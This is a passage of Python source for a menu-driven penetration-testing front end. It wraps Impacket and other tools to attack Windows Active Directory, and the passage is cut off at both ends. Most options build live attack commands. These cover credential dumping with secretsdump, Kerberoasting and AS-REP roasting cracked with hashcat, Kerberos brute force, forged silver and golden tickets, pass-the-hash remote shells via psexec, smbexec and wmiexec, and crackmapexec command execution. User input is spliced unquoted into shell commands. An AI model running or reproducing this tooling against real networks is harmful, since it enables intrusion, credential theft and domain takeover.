      command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " cmd.exe > SHARES.tmp")
      command("cat SHARES.tmp")
    
      command("sed -i '1,3d' SHARES.tmp")
      command("sed -i -e 's/share //g' SHARES.tmp")

      SH0  = linecache.getline('SHARES.tmp', 1)
      SH1  = linecache.getline('SHARES.tmp', 2)
      SH2  = linecache.getline('SHARES.tmp', 3)
      SH3  = linecache.getline('SHARES.tmp', 4)
      SH4  = linecache.getline('SHARES.tmp', 5)
      SH5  = linecache.getline('SHARES.tmp', 6)
      SH6  = linecache.getline('SHARES.tmp', 7)
      SH7  = linecache.getline('SHARES.tmp', 8)
      SH8  = linecache.getline('SHARES.tmp', 9)
      SH9  = linecache.getline('SHARES.tmp', 10)
      SH10 = linecache.getline('SHARES.tmp', 11)
      SH11 = linecache.getline('SHARES.tmp', 12)

      SH0  = SH0.lstrip("[-] ")
      SH1  = SH1.lstrip("[-] ")
      SH2  = SH2.lstrip("[-] ")
      SH3  = SH3.lstrip("[-] ")
      SH4  = SH4.lstrip("[-] ")
      SH5  = SH5.lstrip("[-] ")
      SH6  = SH6.lstrip("[-] ")
      SH7  = SH7.lstrip("[-] ")
      SH8  = SH8.lstrip("[-] ")
      SH9  = SH9.lstrip("[-] ")
      SH10 = SH10.lstrip("[-] ")
      SH11 = SH11.lstrip("[-] ")

      SH0  = SH0.replace("'", "")
      SH1  = SH1.replace("'", "")
      SH2  = SH2.replace("'", "")
      SH3  = SH3.replace("'", "")
      SH4  = SH4.replace("'", "")
      SH5  = SH5.replace("'", "")
      SH6  = SH6.replace("'", "")
      SH7  = SH7.replace("'", "")
      SH8  = SH8.replace("'", "")
      SH9  = SH9.replace("'", "")
      SH10 = SH10.replace("'", "")
      SH11 = SH11.replace("'", "")

      if SH0 !="":  SH0,SHA0   = SH0.split("is")
      if SH1 !="":  SH1,SHA1   = SH1.split("is")
      if SH2 !="":  SH2,SHA2   = SH2.split("is")
      if SH3 !="":  SH3,SHA3   = SH3.split("is")
      if SH4 !="":  SH4,SHA4   = SH4.split("is")
      if SH5 !="":  SH5,SHA5   = SH5.split("is")
      if SH6 !="":  SH6,SHA6   = SH6.split("is")
      if SH7 !="":  SH7,SHA7   = SH7.split("is")
      if SH8 !="":  SH8,SHA8   = SH8.split("is")
      if SH9 !="":  SH9,SHA9   = SH9.split("is")
      if SH10 !="": SH10,SHA10 = SH10.split("is")
      if SH11 !="": SH11,SHA11 = SH11.split("is")

      SH0   = dpadding(SH0, COL5)
      SH1   = dpadding(SH1, COL5)
      SH2   = dpadding(SH2, COL5)
      SH3   = dpadding(SH3, COL5)
      SH4   = dpadding(SH4, COL5)
      SH5   = dpadding(SH5, COL5)
      SH6   = dpadding(SH6, COL5)
      SH7   = dpadding(SH7, COL5)
      SH8   = dpadding(SH8, COL5)
      SH9   = dpadding(SH9, COL5)
      SH10  = dpadding(SH10, COL5)
      SH11  = dpadding(SH11, COL5)

      SHA0  = padding(SHA0, COL5)
      SHA1  = padding(SHA1, COL5)
      SHA2  = padding(SHA2, COL5)
      SHA3  = padding(SHA3, COL5)
      SHA4  = padding(SHA4, COL5)
      SHA5  = padding(SHA5, COL5)
      SHA6  = padding(SHA6, COL5)
      SHA7  = padding(SHA7, COL5)
      SHA8  = padding(SHA8, COL5)
      SHA9  = padding(SHA9, COL5)
      SHA10 = padding(SHA10, COL5)
      SHA11 = padding(SHA11, COL5)

      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '26':
      command(PRO + "smbexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '27':
      command(PRO + "wmiexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ifmap.py IP 135.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':
      command(PRO + "ifmap.py " + TIP.rstrip(" ") + " 135")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - opdump.py IP 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '29':
      ifmap = input("\nEnter MSRPC interface (ifmap) : ")     
      if ifmap != "":
         command(PRO + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP.
# Details : Anonymous login check.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '30':
      command("enum4linux -v -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -GUC --da --full.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='31':
      command(PRO + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + HST.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -GUC --da --full")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='32':
      print("\n[+] Please wait....\n")
      command(PRO + "lookupsid.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> DOMAIN.tmp")
      command("cat DOMAIN.tmp")
      command("cat DOMAIN.tmp | grep 'Domain SID' >> SID.tmp")
      os.remove("DOMAIN.tmp")
      DOMSID = linecache.getline("SID.tmp", 1)
      os.remove("SID.tmp")
      if DOMSID != "":
         WGRP = DOMSID.replace('[*] Domain SID is: ',"")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='33':
      print("\n[+] Please wait...")
      os.remove("USERS.tmp")	# CLEAR WORK FILE
      os.remove("users.txt")	# CLEAR WORK FILE

      command(PRO + "samrdump.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> USERS.tmp")
      command("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
      command("sort USERS.tmp > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
      os.remove("USERS.tmp")
      command("mv USERS2.tmp USERS.tmp")
      
      for x in range (0, MAX):
         US[x] = linecache.getline('USERS.tmp', x+1)
         if US[x] != "":
            US[x] = US[x].replace("Found user: ", "")
            US[x] = US[x].split(",")
            US[x] = US[x][0]
            US[x] = padding(US[x], COL3)
            if US[x] != "":
               print("[-] Found user " + US[x])
               command("echo " + US[x] + " >> users.txt")	# ASSIGN USERS NAME
            else:
               US[x] = "                          "		# ASSIGN EMPTY USERS
            PA[x] = "................................"		# RESET PASSWORDS
         else:
            US[x] = "                          "
            PA[x] = "                                "
      
      if US[12] != "                          ":
         US[11] = "Some users are not shown!!..."
         US[11] = padding(US[11], COL3)


      print("[*] All done!")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='34':
      command(PRO + "rpcdump.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
# Details : #HKEY_LOCAL_MACHINE\SAM
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='35':
      command(PRO + "reg.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
# Modified: 
# -------------------------------------------------------------------------------------

   if selection =='36':
      command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R ?
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '37':
      command("smbmap -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + HST.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + HIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '38':
      command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + HIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '39':
      command("rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      command(PRO + "GetADUsers.py -all " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -dc-ip "  + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=users.txt IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '41':
      print("\n[+] Please wait...")      
      print("\n[+] Checking to see if any found username is assigned to Kerberous...")
      command("nmap -p 88 -script krb5-enum-users -script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
      command("sed -i '/@/!d' KUSERS.tmp")
      command("sort KUSERS.tmp > USERS2.tmp")
      os.remove("KUSERS.tmp")
      os.remove("USERS.tmp")	# CLEAR WORK FILE
      os.remove("users.txt")	# CLEAR WORK FILE	
      for x in range (0,MAX):
         US[x] = linecache.getline("USERS2.tmp", x+1)
         if US[x] != "":
            US[x] = US[x].replace("|     ", "")
            US[x] = US[x].replace("|_    ", "")
            US[x] = US[x].split("@")
            US[x] = US[x][0]
            if US[x] != "                                ":
               print("[-] Found user " + US[x])
               command("echo " + US[x] + " >> users.txt")	# ASSIGN FOUND USERS
            else:
               US[x] = "                                "	# ASSIGN EMPTY USERS
            PA[x] = "................................";		# RESET PASSWORDS
         US[x] = padding(US[x], COL3)
         PA[x] = padding(PA[x], COL4)
      
      if US[12] != "                          ":
         US[11] = "Some users are not shown!!"
      command("mv USERS2.tmp USERS.tmp")
      print("[*] All done!")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - kerbrute.py -domain DOMAIN -users users.txt -passwords passwords.txt -outputfile optional.txt.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='42':
      command(PRO + "kerbrute.py -domain " + HST.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '43':
      if linecache.getline('users.txt', 1) != " ":
         command(PRO + "GetUserSPNs.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -outputfile hashroast1.txt")
         print("\n[+] Cracking hash values if they exists...\n")
         command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
         command("strings cracked1.txt")
      else:
         print("The file users.txt is empty...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashroast2.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='44':
      if linecache.getline('users.txt', 1) != " ":
         command(PRO + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + HST.rstrip(" ") + "/ -usersfile users.txt")
         print("\n[+] Cracking hash values if they exists...\n")
         command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
         command("strings cracked2.txt")
      else:
         print("The file users.txt is empty...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '45':
      if PAS[:1] != "\"":
         FRST = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
         FRST = binascii.hexlify(FRST)
         FRST = str(FRST)
         FRST = FRST.lstrip("b'")
         FRST = FRST.rstrip("'")
      else:
         print("Password not found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
# Details :                        getTGT.py DOMAIN/USER -hashes :HASH
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '46':
      print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
      if PAS[:1] != "\"":
         command(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
      else:
         if FRST[:1] != "":
            command(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + FRST)
            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
         else:
            print("User password or hash required...")
      if os.path.exists(USR.rstrip(" ") + ".ccache"):
         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
      else:
          print("TGT was not generated...")
      print("\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n")
      HASH = "................................"
      for x in range (0, MAX):
         if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
            HASH = PA[x].rstrip(" ")                 # GET HASH
      if HASH[:1] != ".":
         command(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + POR.rstrip(" ") + " -hashes :" + HASH)
         command("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
         if os.path.exists(POR.rstrip(" ") + ".ccache"):
            command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
         else:
            print("TGT was not generated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Pass the Ticket.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '47':
      print("\nPass the Ticket has not been implemented yet...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/Forest
# Details : Silver Ticket!! 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '48':
      print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
      if (FRST[:1] != "") & (WGRP[:1] != ""):
         command(PRO + "ticketer.py -nthash " + FRST.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " -spn cifs/" + DNSN.rstrip(" ") + " " + USR.rstrip(" "))
         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
      else:
         print("Hash or Domain-SID not found...")
      if os.path.exists(USR.rstrip(" ") + ".ccache"):
         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
      else:
          print("Golden TGT was not generated...")      
      print("\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n")
      HASH = "................................"
      for x in range (0, MAX):
         if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
            HASH = PA[x].rstrip(" ")                 # GET HASH
      if HASH[:1] != ".":
         command(PRO + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " -spn cifs/" + DNSN.rstrip(" ") + " " + POR.rstrip(" "))
         command("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
      if os.path.exists(POR.rstrip(" ") + ".ccache"):
         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
      else:
         print("Golden TGT was not generated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub11bc5814059277a4c697f5536e27beaa
# Version : 1.0
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '49':
      print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
      if (FRST[:1] != "") & (WGRP[:1] != ""):
         command(PRO + "ticketer.py -nthash " + FRST.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " " + USR.rstrip(" "))
         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
      else:
         command("echo 'Hash or Domain-SID not found...'")
      if os.path.exists(USR.rstrip(" ") + ".ccache"):
         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
      else:
          print("Golden TGT was not generated...")
      print("\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n")
      HASH = "................................"
      for x in range (0, MAX):
         if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
            HASH = PA[x].rstrip(" ")                 # GET HASH
      if HASH[:1] != ".":
         command(PRO + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " " + POR.rstrip(" "))
         command("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
      if os.path.exists(POR.rstrip(" ") + ".ccache"):
         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
      else:
         print("Golden TGT was not generated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='50':
      print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
      command(PRO + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + HST.rstrip(" "))
      print("\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n")
      HASH = "................................"
      for x in range (0, MAX):
         if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
            HASH = PA[x].rstrip(" ")                 # GET HASH
      if HASH[:1] != ".":
         command(PRO + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " -hashes :" + HASH + " "  + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" "))
      else:
         print("Hash value was not found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='51':
      command("ldapdomaindump -u '" + HST.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
      print("\n[+] Checking downloaded files: \n")
      command("ls -la ./" + DIR.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - BLOODHOUND STUFF!!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='52':
      print("Reserved for BLOODHOUND command...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='53':
      command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + HST.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='54':
      print("\n[+] Please wait...\n")
      os.remove("SECRETS.tmp")
      command(PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
      command("cat SECRETS.tmp")
      command("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
      os.remove("SECRETS2.tmp")
      command("cat SECRETS.tmp | wc -l > count.txt")
      count = linecache.getline("count.txt", 1)
      count2 = int(count)
      os.remove("count.txt")
      for x in range(0, count2):
         data = linecache.getline("SECRETS.tmp",x+1)
         data = data.replace(":::","")
         temp = HST.rstrip(" ") + "\\"
         data = data.replace(temp,"")
         get1,get2,get3,get4 = data.split(":")
         get1 = padding(get1,COL3) 			# USER
         get4 = padding(get4,COL4) 			# PASSWORD
         for y in range (0, MAX):
            if US[y] == get1:				# MATCH USER
               PA[y] = get4				# MATCH PASSWORD 
      for z in range(0, MAX):
         if US[z].rstrip(" ") == USR.rstrip(" "):	# CURRENT USER
            FRST = PA[z]				# DISPLAY HASH 
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - crackmapexec smb IP -u IMPERSONATE -H HASH -x 'net user Administrator /domain' --exec=method smbexec
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='55':
      if (USR[:1] != "\""):# & (PAS[:1] != "\""):
         print("\n[-]Trying user " + USR.rstrip(" ") + " with password " + PAS.rstrip(" ") + "...\n")
         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + HST.rstrip(" ") + "\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --shares ")
         print("\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
         HASH = " "
         for x in range (0, MAX):
            if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
               HASH = PA[x].rstrip(" ")                 # GET HASH
         if HASH[:1] != " ":
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + POR.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain' --exec-method smbexec")
         else:
            print("No hash value was found for user " + POR.rstrip(" ") + "...")
      else:
         print("Username or password not found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTLM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='56':
      print("\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n")
      command(PRO + "psexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      print("\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
      HASH = "................................"
      for x in range (0,MAX):
         if US[x].rstrip(" ") == POR.rstrip(" "):
            HASH = PA[x].rstrip(" ")
      if HASH[:1] != ".":
         command(PRO + "psexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))     
      else:
         print("No hash value was found for user " + POR.rstrip(" ") + "...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTLM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='57':
      print("\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n")
      command(PRO + "smbexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      print("\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
      HASH = "................................"
      for x in range (0,MAX):
         if US[x].rstrip(" ") == POR.rstrip(" "):
            HASH = PA[x].rstrip(" ")
      if HASH[:1] != ".":
         command(PRO + "smbexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))
      else:
         print("No hash value was found for user " + POR.rstrip(" ") + "...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTLM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='58':
      print("\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n")
      command(PRO + "wmiexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      print("\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
      HASH = "................................"
      for x in range (0,MAX):
         if US[x].rstrip(" ") == POR.rstrip(" "):
            HASH = PA[x].rstrip(" ")
      if HASH[:1] != ".":
         command(PRO + "smbexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))   
      else:
         print("No hash value was found for user " + POR.rstrip(" ") + "...")
      prompt()     

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='59':
